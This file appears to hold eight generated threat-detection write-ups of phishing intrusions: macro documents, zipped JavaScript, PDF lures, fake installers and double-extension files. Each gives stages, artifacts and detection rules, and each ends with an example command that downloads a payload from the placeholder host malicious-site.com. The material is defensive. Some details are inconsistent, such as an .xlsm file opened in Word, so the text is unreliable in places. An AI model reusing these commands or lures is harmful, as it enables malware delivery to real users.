@@ -1,0 +1,371 @@
+<output>
+Pattern Name: Spearphishing Attachment Delivery  
+Scenario Overview: An attacker sends a spearphishing email containing a malicious Microsoft Word attachment designed to exploit the user's trust and prompt them to open the file. The attachment contains a macro that, when enabled, executes a payload that compromises the system.
+
+Attack Flow Breakdown:  
+**Stage 1: User Interaction**  
+- **Application Involved**: Outlook  
+- **User Action**: The user receives an email from a seemingly legitimate source (e.g., admin@338) with a subject line that creates urgency (e.g., "Important Update").  
+- **Key Artifacts**: Email logs showing the sender's address, subject line, and attachment name (e.g., "Invoice.docm").  
+- **Detection Rule**: Monitor for emails with attachments that have .docm extensions and originate from external domains.
+
+**Stage 2: File Opening**  
+- **Application Involved**: Microsoft Word  
+- **User Action**: The user opens the attachment, triggering a prompt to enable macros.  
+- **Key Artifacts**: Process creation logs showing `WINWORD.EXE` initiated by `OUTLOOK.EXE`.  
+- **Detection Rule**: Identify process creation events where `WINWORD.EXE` is spawned from `OUTLOOK.EXE` with a .docm file.
+
+**Stage 3: Macro Execution**  
+- **Application Involved**: Microsoft Word  
+- **User Action**: The user enables macros, allowing the embedded malicious code to execute.  
+- **Key Artifacts**: Logs indicating macro execution (e.g., `VBAProject` execution).  
+- **Detection Rule**: Monitor for macro execution events within Microsoft Word documents, especially those that were opened from email attachments.
+
+**Stage 4: Payload Execution**  
+- **Application Involved**: PowerShell (or another payload execution method)  
+- **User Action**: The macro executes a PowerShell command to download and execute a malicious payload from a remote server.  
+- **Key Artifacts**: PowerShell command logs showing execution of `Invoke-WebRequest` or `Start-Process` commands.  
+- **Detection Rule**: Track PowerShell command execution that downloads files from suspicious URLs.
+
+**Stage 5: Persistence Mechanism**  
+- **Application Involved**: Windows Registry  
+- **User Action**: The payload modifies registry keys to ensure persistence.  
+- **Key Artifacts**: Registry changes in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.  
+- **Detection Rule**: Monitor for registry modifications that add new entries for persistence, especially those related to recently executed applications.
+
+**Stage 6: Command and Control Communication**  
+- **Application Involved**: Network  
+- **User Action**: The compromised system communicates with the attacker's command and control server.  
+- **Key Artifacts**: Network logs showing outbound connections to known malicious IP addresses or domains.  
+- **Detection Rule**: Analyze network traffic for unusual outbound connections, particularly to newly established domains or IPs.
+
+```shell
+# Example PowerShell command executed by the macro to download a payload
+powershell -Command "Invoke-WebRequest -Uri 'http://malicious-site.com/payload.exe' -OutFile 'C:\Users\Victim\Downloads\payload.exe'"
+```
+
+</output>
+
+<output>
+Pattern Name: Malicious Macro Execution  
+Scenario Overview: An attacker embeds a malicious macro in a Microsoft Word document sent via spearphishing email. When the user opens the document and enables macros, the macro executes, leading to system compromise.
+
+Attack Flow Breakdown:  
+**Stage 1: User Interaction**  
+- **Application Involved**: Outlook  
+- **User Action**: The user receives a spearphishing email with a malicious Word document attachment.  
+- **Key Artifacts**: Email logs showing the sender's address and attachment details (e.g., "Report.xlsm").  
+- **Detection Rule**: Monitor for emails with .xlsm attachments from external sources.
+
+**Stage 2: File Opening**  
+- **Application Involved**: Microsoft Word  
+- **User Action**: The user opens the attachment, triggering a macro enablement prompt.  
+- **Key Artifacts**: Process creation logs showing `WINWORD.EXE` initiated by `OUTLOOK.EXE`.  
+- **Detection Rule**: Identify instances where `WINWORD.EXE` is launched from `OUTLOOK.EXE` with a .xlsm file.
+
+**Stage 3: Macro Execution**  
+- **Application Involved**: Microsoft Word  
+- **User Action**: The user enables macros, allowing the malicious code to run.  
+- **Key Artifacts**: Logs indicating macro execution (e.g., `VBAProject` execution).  
+- **Detection Rule**: Monitor for macro execution events within Word documents, especially those opened from email attachments.
+
+**Stage 4: Payload Execution**  
+- **Application Involved**: PowerShell  
+- **User Action**: The macro executes a PowerShell command to download and run a malicious payload.  
+- **Key Artifacts**: PowerShell command logs showing execution of `Invoke-WebRequest`.  
+- **Detection Rule**: Track PowerShell command execution that downloads files from suspicious URLs.
+
+**Stage 5: Persistence Mechanism**  
+- **Application Involved**: Windows Registry  
+- **User Action**: The payload modifies registry keys for persistence.  
+- **Key Artifacts**: Registry changes in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.  
+- **Detection Rule**: Monitor for registry modifications that add new entries for persistence.
+
+**Stage 6: Command and Control Communication**  
+- **Application Involved**: Network  
+- **User Action**: The compromised system communicates with the attacker's command and control server.  
+- **Key Artifacts**: Network logs showing outbound connections to malicious IP addresses.  
+- **Detection Rule**: Analyze network traffic for unusual outbound connections.
+
+```shell
+# Example PowerShell command executed by the macro to download a payload
+powershell -Command "Invoke-WebRequest -Uri 'http://malicious-site.com/malware.exe' -OutFile 'C:\Users\Victim\Downloads\malware.exe'"
+```
+
+</output>
+
+<output>
+Pattern Name: User Prompt for Macro Enablement  
+Scenario Overview: An attacker sends a malicious document that prompts the user to enable macros. Once enabled, the macro executes a payload that compromises the system.
+
+Attack Flow Breakdown:  
+**Stage 1: User Interaction**  
+- **Application Involved**: Outlook  
+- **User Action**: The user receives an email with a malicious Word document attachment.  
+- **Key Artifacts**: Email logs showing the sender's address and attachment name (e.g., "Update.docm").  
+- **Detection Rule**: Monitor for emails with .docm attachments from external sources.
+
+**Stage 2: File Opening**  
+- **Application Involved**: Microsoft Word  
+- **User Action**: The user opens the attachment, triggering a macro enablement prompt.  
+- **Key Artifacts**: Process creation logs showing `WINWORD.EXE` initiated by `OUTLOOK.EXE`.  
+- **Detection Rule**: Identify instances where `WINWORD.EXE` is launched from `OUTLOOK.EXE` with a .docm file.
+
+**Stage 3: Macro Execution**  
+- **Application Involved**: Microsoft Word  
+- **User Action**: The user enables macros, allowing the malicious code to run.  
+- **Key Artifacts**: Logs indicating macro execution (e.g., `VBAProject` execution).  
+- **Detection Rule**: Monitor for macro execution events within Word documents, especially those opened from email attachments.
+
+**Stage 4: Payload Execution**  
+- **Application Involved**: PowerShell  
+- **User Action**: The macro executes a PowerShell command to download and run a malicious payload.  
+- **Key Artifacts**: PowerShell command logs showing execution of `Invoke-WebRequest`.  
+- **Detection Rule**: Track PowerShell command execution that downloads files from suspicious URLs.
+
+**Stage 5: Persistence Mechanism**  
+- **Application Involved**: Windows Registry  
+- **User Action**: The payload modifies registry keys for persistence.  
+- **Key Artifacts**: Registry changes in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.  
+- **Detection Rule**: Monitor for registry modifications that add new entries for persistence.
+
+**Stage 6: Command and Control Communication**  
+- **Application Involved**: Network  
+- **User Action**: The compromised system communicates with the attacker's command and control server.  
+- **Key Artifacts**: Network logs showing outbound connections to malicious IP addresses.  
+- **Detection Rule**: Analyze network traffic for unusual outbound connections.
+
+```shell
+# Example PowerShell command executed by the macro to download a payload
+powershell -Command "Invoke-WebRequest -Uri 'http://malicious-site.com/malicious.exe' -OutFile 'C:\Users\Victim\Downloads\malicious.exe'"
+```
+
+</output>
+
+<output>
+Pattern Name: Execution via User Interaction  
+Scenario Overview: An attacker sends an email with a malicious attachment that requires user interaction to execute. The user opens the file, enabling macros that execute a payload.
+
+Attack Flow Breakdown:  
+**Stage 1: User Interaction**  
+- **Application Involved**: Outlook  
+- **User Action**: The user receives a spearphishing email with a malicious attachment (e.g., "Invoice.xlsm").  
+- **Key Artifacts**: Email logs showing the sender's address and attachment details.  
+- **Detection Rule**: Monitor for emails with .xlsm attachments from external sources.
+
+**Stage 2: File Opening**  
+- **Application Involved**: Microsoft Excel  
+- **User Action**: The user opens the attachment, triggering a macro enablement prompt.  
+- **Key Artifacts**: Process creation logs showing `EXCEL.EXE` initiated by `OUTLOOK.EXE`.  
+- **Detection Rule**: Identify instances where `EXCEL.EXE` is launched from `OUTLOOK.EXE` with a .xlsm file.
+
+**Stage 3: Macro Execution**  
+- **Application Involved**: Microsoft Excel  
+- **User Action**: The user enables macros, allowing the malicious code to run.  
+- **Key Artifacts**: Logs indicating macro execution (e.g., `VBAProject` execution).  
+- **Detection Rule**: Monitor for macro execution events within Excel documents, especially those opened from email attachments.
+
+**Stage 4: Payload Execution**  
+- **Application Involved**: PowerShell  
+- **User Action**: The macro executes a PowerShell command to download and run a malicious payload.  
+- **Key Artifacts**: PowerShell command logs showing execution of `Invoke-WebRequest`.  
+- **Detection Rule**: Track PowerShell command execution that downloads files from suspicious URLs.
+
+**Stage 5: Persistence Mechanism**  
+- **Application Involved**: Windows Registry  
+- **User Action**: The payload modifies registry keys for persistence.  
+- **Key Artifacts**: Registry changes in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.  
+- **Detection Rule**: Monitor for registry modifications that add new entries for persistence.
+
+**Stage 6: Command and Control Communication**  
+- **Application Involved**: Network  
+- **User Action**: The compromised system communicates with the attacker's command and control server.  
+- **Key Artifacts**: Network logs showing outbound connections to malicious IP addresses.  
+- **Detection Rule**: Analyze network traffic for unusual outbound connections.
+
+```shell
+# Example PowerShell command executed by the macro to download a payload
+powershell -Command "Invoke-WebRequest -Uri 'http://malicious-site.com/exploit.exe' -OutFile 'C:\Users\Victim\Downloads\exploit.exe'"
+```
+
+</output>
+
+<output>
+Pattern Name: Obfuscated File Delivery  
+Scenario Overview: An attacker sends a password-protected ZIP file containing a malicious JavaScript file disguised as a legitimate document. The user is tricked into extracting and executing the file.
+
+Attack Flow Breakdown:  
+**Stage 1: User Interaction**  
+- **Application Involved**: Outlook  
+- **User Action**: The user receives an email with a password-protected ZIP file attachment (e.g., "Documents.zip").  
+- **Key Artifacts**: Email logs showing the sender's address and attachment details.  
+- **Detection Rule**: Monitor for emails with ZIP attachments that are password-protected.
+
+**Stage 2: File Extraction**  
+- **Application Involved**: Windows Explorer  
+- **User Action**: The user extracts the contents of the ZIP file, revealing a JavaScript file (e.g., "Document.js").  
+- **Key Artifacts**: File system logs showing extraction events and the creation of the JavaScript file.  
+- **Detection Rule**: Track file extraction events from ZIP files and the creation of JavaScript files in user directories.
+
+**Stage 3: File Execution**  
+- **Application Involved**: Windows Command Prompt  
+- **User Action**: The user executes the JavaScript file, which runs a malicious payload.  
+- **Key Artifacts**: Process creation logs showing `cmd.exe` executing the JavaScript file.  
+- **Detection Rule**: Monitor for execution of JavaScript files from user directories, especially those extracted from ZIP files.
+
+**Stage 4: Payload Execution**  
+- **Application Involved**: PowerShell  
+- **User Action**: The JavaScript file executes a PowerShell command to download and run a malicious payload.  
+- **Key Artifacts**: PowerShell command logs showing execution of `Invoke-WebRequest`.  
+- **Detection Rule**: Track PowerShell command execution that downloads files from suspicious URLs.
+
+**Stage 5: Persistence Mechanism**  
+- **Application Involved**: Windows Registry  
+- **User Action**: The payload modifies registry keys for persistence.  
+- **Key Artifacts**: Registry changes in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.  
+- **Detection Rule**: Monitor for registry modifications that add new entries for persistence.
+
+**Stage 6: Command and Control Communication**  
+- **Application Involved**: Network  
+- **User Action**: The compromised system communicates with the attacker's command and control server.  
+- **Key Artifacts**: Network logs showing outbound connections to malicious IP addresses.  
+- **Detection Rule**: Analyze network traffic for unusual outbound connections.
+
+```shell
+# Example PowerShell command executed by the JavaScript to download a payload
+powershell -Command "Invoke-WebRequest -Uri 'http://malicious-site.com/malicious.js' -OutFile 'C:\Users\Victim\Downloads\malicious.js'"
+```
+
+</output>
+
+<output>
+Pattern Name: Social Engineering Lures  
+Scenario Overview: An attacker uses social engineering tactics to craft an email that entices the user to open a malicious attachment disguised as a legitimate document. The user is tricked into executing the file, leading to system compromise.
+
+Attack Flow Breakdown:  
+**Stage 1: User Interaction**  
+- **Application Involved**: Outlook  
+- **User Action**: The user receives an email with a malicious attachment (e.g., "Important_Update.pdf").  
+- **Key Artifacts**: Email logs showing the sender's address and attachment details.  
+- **Detection Rule**: Monitor for emails with PDF attachments that originate from external sources.
+
+**Stage 2: File Opening**  
+- **Application Involved**: Adobe Reader  
+- **User Action**: The user opens the PDF attachment, which contains a link to a malicious website.  
+- **Key Artifacts**: Process creation logs showing `AcroRd32.exe` initiated by `OUTLOOK.EXE`.  
+- **Detection Rule**: Identify instances where `AcroRd32.exe` is launched from `OUTLOOK.EXE` with a PDF file.
+
+**Stage 3: Link Click**  
+- **Application Involved**: Web Browser (e.g., Chrome)  
+- **User Action**: The user clicks on a link within the PDF that redirects them to a malicious site.  
+- **Key Artifacts**: Network logs showing outbound connections to the malicious URL.  
+- **Detection Rule**: Monitor for web traffic to known malicious domains originating from PDF files.
+
+**Stage 4: Payload Execution**  
+- **Application Involved**: PowerShell  
+- **User Action**: The malicious site serves a payload that the user is prompted to download and execute.  
+- **Key Artifacts**: PowerShell command logs showing execution of `Invoke-WebRequest`.  
+- **Detection Rule**: Track PowerShell command execution that downloads files from suspicious URLs.
+
+**Stage 5: Persistence Mechanism**  
+- **Application Involved**: Windows Registry  
+- **User Action**: The payload modifies registry keys for persistence.  
+- **Key Artifacts**: Registry changes in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.  
+- **Detection Rule**: Monitor for registry modifications that add new entries for persistence.
+
+**Stage 6: Command and Control Communication**  
+- **Application Involved**: Network  
+- **User Action**: The compromised system communicates with the attacker's command and control server.  
+- **Key Artifacts**: Network logs showing outbound connections to malicious IP addresses.  
+- **Detection Rule**: Analyze network traffic for unusual outbound connections.
+
+```shell
+# Example PowerShell command executed to download a payload from a malicious site
+powershell -Command "Invoke-WebRequest -Uri 'http://malicious-site.com/exploit.exe' -OutFile 'C:\Users\Victim\Downloads\exploit.exe'"
+```
+
+</output>
+
+<output>
+Pattern Name: Execution of Malicious Installers  
+Scenario Overview: An attacker sends an email with a malicious installer disguised as a legitimate application. The user is tricked into executing the installer, leading to system compromise.
+
+Attack Flow Breakdown:  
+**Stage 1: User Interaction**  
+- **Application Involved**: Outlook  
+- **User Action**: The user receives an email with a malicious installer attachment (e.g., "Setup.exe").  
+- **Key Artifacts**: Email logs showing the sender's address and attachment details.  
+- **Detection Rule**: Monitor for emails with .exe attachments from external sources.
+
+**Stage 2: File Opening**  
+- **Application Involved**: Windows Explorer  
+- **User Action**: The user downloads and executes the installer.  
+- **Key Artifacts**: Process creation logs showing `Setup.exe` execution.  
+- **Detection Rule**: Identify instances where executable files are run from user directories.
+
+**Stage 3: Installer Execution**  
+- **Application Involved**: Windows Installer  
+- **User Action**: The installer runs, executing malicious code.  
+- **Key Artifacts**: Logs indicating the execution of the installer and any subsequent processes.  
+- **Detection Rule**: Monitor for installation events that create new processes or modify existing ones.
+
+**Stage 4: Persistence Mechanism**  
+- **Application Involved**: Windows Registry  
+- **User Action**: The installer modifies registry keys for persistence.  
+- **Key Artifacts**: Registry changes in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.  
+- **Detection Rule**: Monitor for registry modifications that add new entries for persistence.
+
+**Stage 5: Command and Control Communication**  
+- **Application Involved**: Network  
+- **User Action**: The compromised system communicates with the attacker's command and control server.  
+- **Key Artifacts**: Network logs showing outbound connections to malicious IP addresses.  
+- **Detection Rule**: Analyze network traffic for unusual outbound connections.
+
+```shell
+# Example command executed by the installer to download a payload
+cmd.exe /c "start /b http://malicious-site.com/malicious.exe"
+```
+
+</output>
+
+<output>
+Pattern Name: File Type Masquerading  
+Scenario Overview: An attacker disguises a malicious file as a legitimate document type to trick the user into executing it. The user opens the file, leading to system compromise.
+
+Attack Flow Breakdown:  
+**Stage 1: User Interaction**  
+- **Application Involved**: Outlook  
+- **User Action**: The user receives an email with a file masquerading as a legitimate document (e.g., "Report.pdf.exe").  
+- **Key Artifacts**: Email logs showing the sender's address and attachment details.  
+- **Detection Rule**: Monitor for emails with attachments that have double extensions (e.g., .pdf.exe).
+
+**Stage 2: File Opening**  
+- **Application Involved**: Windows Explorer  
+- **User Action**: The user opens the file, believing it to be a PDF document.  
+- **Key Artifacts**: Process creation logs showing `explorer.exe` executing the file.  
+- **Detection Rule**: Identify instances where files with double extensions are executed.
+
+**Stage 3: Payload Execution**  
+- **Application Involved**: PowerShell  
+- **User Action**: The file executes a PowerShell command to download and run a malicious payload.  
+- **Key Artifacts**: PowerShell command logs showing execution of `Invoke-WebRequest`.  
+- **Detection Rule**: Track PowerShell command execution that downloads files from suspicious URLs.
+
+**Stage 4: Persistence Mechanism**  
+- **Application Involved**: Windows Registry  
+- **User Action**: The payload modifies registry keys for persistence.  
+- **Key Artifacts**: Registry changes in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.  
+- **Detection Rule**: Monitor for registry modifications that add new entries for persistence.
+
+**Stage 5: Command and Control Communication**  
+- **Application Involved**: Network  
+- **User Action**: The compromised system communicates with the attacker's command and control server.  
+- **Key Artifacts**: Network logs showing outbound connections to malicious IP addresses.  
+- **Detection Rule**: Analyze network traffic for unusual outbound connections.
+
+```shell
+# Example PowerShell command executed to download a payload
+powershell -Command "Invoke-WebRequest -Uri 'http://malicious-site.com/malicious.exe' -OutFile 'C:\Users\Victim\Downloads\malicious.exe'"
+```
+
+</output>
